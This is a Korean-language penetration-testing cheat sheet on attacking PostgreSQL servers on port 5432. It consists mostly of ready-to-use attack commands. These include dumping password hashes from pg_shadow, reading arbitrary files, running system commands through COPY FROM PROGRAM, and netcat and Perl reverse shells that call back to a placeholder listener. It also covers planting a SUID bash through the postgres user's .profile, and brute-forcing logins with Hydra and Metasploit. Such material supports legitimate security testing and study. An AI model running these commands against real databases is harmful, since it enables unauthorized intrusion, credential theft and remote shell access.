---
sidebar_position: 11
---

# PostgreSQL - 5432

## 기본 정보

**포트**: 5432

PostgreSQL은 오픈소스 객체-관계형 데이터베이스 관리 시스템입니다.

## 연결

```bash
# 로컬 연결
psql

# 원격 연결
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>

# 명령 실행
psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
```

## 기본 명령어

```sql
-- 데이터베이스 목록
postgres=# \list

-- 데이터베이스 사용
postgres=# \c
postgres=# \c <DATABASE>

-- 명령 히스토리
postgres=# \s

-- 종료
postgres=# \q

-- 테이블 목록 (현재 스키마)
<DATABASE>=# \dt

-- 테이블 목록 (모든 스키마)
<DATABASE>=# \dt *.*

-- 사용자/역할 목록
<DATABASE>=# \du
<DATABASE>=# \du+

-- 현재 사용자
<DATABASE>=# SELECT user;

-- 테이블 내용 조회
<DATABASE>=# TABLE <TABLE>;

-- 자격증명 읽기
<DATABASE>=# SELECT usename, passwd from pg_shadow;
```

## 파일 시스템 접근

```sql
-- 디렉토리 읽기
<DATABASE>=# SELECT * FROM pg_ls_dir('/'); --

-- 파일 읽기
<DATABASE>=# SELECT pg_read_file('/PATH/TO/FILE/<FILE>', 0, 1000000); --
```

## 원격 코드 실행 (RCE)

### 방법 1: COPY FROM PROGRAM

```sql
-- 테이블 생성 및 명령 실행
<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
<DATABASE>=# CREATE TABLE cmd_exec(cmd_output text);
<DATABASE>=# COPY cmd_exec FROM PROGRAM 'id';
<DATABASE>=# SELECT * FROM cmd_exec;
<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
```

### 방법 2: COPY TO PROGRAM (리버스 쉘)

```sql
-- Netcat 리버스 쉘
<DATABASE>=# COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f';

-- Perl 리버스 쉘
<DATABASE>=# COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<LPORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

### 방법 3: SUID 바이너리 생성

```sql
-- .profile에 SUID bash 생성 명령 작성
<DATABASE>=# COPY (SELECT CAST('cp /bin/bash /var/lib/postgresql/bash;chmod 4777 /var/lib/postgresql/bash;' AS text)) TO '/var/lib/postgresql/.profile';
```

## Nmap

```bash
# PostgreSQL 버전 확인
sudo nmap -p5432 -sV <RHOST>

# PostgreSQL 정보 수집
sudo nmap -p5432 --script pgsql-brute <RHOST>
```

## Hydra 브루트포스

```bash
# PostgreSQL 브루트포스
hydra -L users.txt -P passwords.txt <RHOST> postgres
hydra -l postgres -P passwords.txt <RHOST> postgres
```

## metasploit

```bash
# PostgreSQL 로그인
use auxiliary/scanner/postgres/postgres_login
set RHOSTS <RHOST>
set USERNAME postgres
set PASSWORD postgres
run

# PostgreSQL 버전 확인
use auxiliary/scanner/postgres/postgres_version
set RHOSTS <RHOST>
run

# PostgreSQL 열거
use auxiliary/admin/postgres/postgres_sql
set RHOSTS <RHOST>
set USERNAME postgres
set PASSWORD <PASSWORD>
set SQL SELECT version()
run
```

## 참고

- COPY FROM/TO PROGRAM 권한 확인
- Superuser 권한 확인
- pg_read_file, pg_ls_dir 함수 사용 가능 여부
- 약한 자격증명 테스트 (postgres/postgres)
- /var/lib/postgresql/.profile 악용
